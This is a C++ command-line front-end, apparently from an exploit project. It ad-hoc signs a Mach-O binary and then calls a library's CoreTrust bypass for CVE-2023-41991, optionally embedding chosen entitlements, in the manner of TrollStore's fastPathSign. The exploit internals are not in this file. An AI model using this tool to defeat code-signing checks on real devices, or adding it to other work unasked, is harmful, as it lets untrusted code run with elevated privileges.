// Command-line front-end for the ct_bypass library.
//
// It mirrors TrollStore's fastPathSign: ad-hoc sign the input, then apply the
// CoreTrust bypass (CVE-2023-41991) to it, editing the file in place. The
// library selects and extracts the arm64 slice of a universal binary itself,
// so no temporary-file juggling is needed here.

#include <CoreFoundation/CoreFoundation.h>
#include <cxxopts.hpp>

#include <cstdint>
#include <cstdio>
#include <fstream>
#include <iterator>
#include <string>
#include <vector>

#include "cf_ptr.h"
#include "exploit/ad_hoc_signer.h"
#include "exploit/coretrust_bypass.h"
#include "exploit/return_code.h"
#include "log.h"

#ifndef CT_BYPASS_VERSION
#define CT_BYPASS_VERSION "unknown"
#endif

namespace {

using ct_bypass::CFPtr;
using ct_bypass::ReturnCode;

// Exit codes: success, a usage/input error, or a failed operation.
enum ExitCode { kExitOk = 0, kExitUsage = 1, kExitFailed = 2 };

// Reads a plist file (XML or binary) into a CFDictionary, or null on failure.
CFPtr<CFDictionaryRef> load_entitlements(const std::string& path) {
  std::ifstream file(path, std::ios::binary);
  if (!file) {
    ct_bypass::log::error("cannot open entitlements file %s", path.c_str());
    return nullptr;
  }
  std::vector<UInt8> bytes((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());

  CFPtr<CFDataRef> data(CFDataCreate(kCFAllocatorDefault, bytes.data(),
                                     static_cast<CFIndex>(bytes.size())));
  if (!data) return nullptr;

  CFPtr<CFPropertyListRef> plist(CFPropertyListCreateWithData(
      kCFAllocatorDefault, data.get(), kCFPropertyListImmutable, nullptr,
      nullptr));
  if (!plist || CFGetTypeID(plist.get()) != CFDictionaryGetTypeID()) {
    ct_bypass::log::error("%s is not a property-list dictionary", path.c_str());
    return nullptr;
  }
  return CFPtr<CFDictionaryRef>(
      static_cast<CFDictionaryRef>(plist.release()));
}

// Ad-hoc signs (unless --no-adhoc) and bypasses `input`, logging each step
ExitCode run(const std::string& input, const cxxopts::ParseResult& args) {
  namespace log = ct_bypass::log;

  log::step("Ad-hoc sign %s", input.c_str());
  CFPtr<CFDictionaryRef> entitlements;
  if (args.count("entitlements")) {
    const std::string path = args["entitlements"].as<std::string>();
    log::substep("Load entitlements from %s", path.c_str());
    entitlements = load_entitlements(path);
    if (!entitlements) return kExitUsage;
  }

  if (args.count("no-adhoc")) {
    log::substep("Skip signing (--no-adhoc)");
  } else {
    log::substep("Sign with Security.framework");
    ReturnCode rc = ct_bypass::AdHocSigner::create(
                        input, /*preserve_metadata=*/true, entitlements.get())
                        ->sign();
    if (failed(rc)) {
      // As in fastPathSign: an existing signature may still be enough, so the
      // bypass is attempted regardless.
      log::warn("ad-hoc signing failed (%d); continuing",
                static_cast<int>(rc));
    }
  }

  // The library logs its own steps, continuing the numbering
  ReturnCode rc = ct_bypass::CoreTrustBypass::create(input)->bypass();
  if (failed(rc)) {
    log::error("CoreTrust bypass failed (%d)", static_cast<int>(rc));
    return kExitFailed;
  }
  return kExitOk;
}

}  // namespace

int main(int argc, char** argv) {
  cxxopts::Options options(
      "ct_bypass",
      "Ad-hoc sign a Mach-O and apply the CoreTrust bypass (CVE-2023-41991), "
      "editing the file in place.\nA universal binary is replaced by its "
      "re-signed arm64 slice.");
  options.add_options()
      ("e,entitlements",
       "Entitlements plist to embed while ad-hoc signing",
       cxxopts::value<std::string>(), "<file>")
      ("no-adhoc", "Skip ad-hoc signing and bypass the binary as-is")
      ("h,help", "Show this help and exit")
      ("v,version", "Show the version and exit")
      ("input", "Mach-O binary to re-sign",
       cxxopts::value<std::string>());
  options.parse_positional({"input"});
  options.positional_help("<binary>");

  cxxopts::ParseResult args;
  try {
    args = options.parse(argc, argv);
  } catch (const cxxopts::exceptions::exception& e) {
    fprintf(stderr, "Error: %s\n", e.what());
    fprintf(stderr, "%s", options.help().c_str());
    return kExitUsage;
  }

  if (args.count("help")) {
    printf("%s", options.help().c_str());
    return kExitOk;
  }
  if (args.count("version")) {
    printf("ct_bypass %s\n", CT_BYPASS_VERSION);
    return kExitOk;
  }
  if (!args.count("input")) {
    fprintf(stderr, "Error: no input binary given\n");
    fprintf(stderr, "%s", options.help().c_str());
    return kExitUsage;
  }

  ExitCode exit_code = run(args["input"].as<std::string>(), args);
  ct_bypass::log::result(exit_code == kExitOk);
  return exit_code;
}
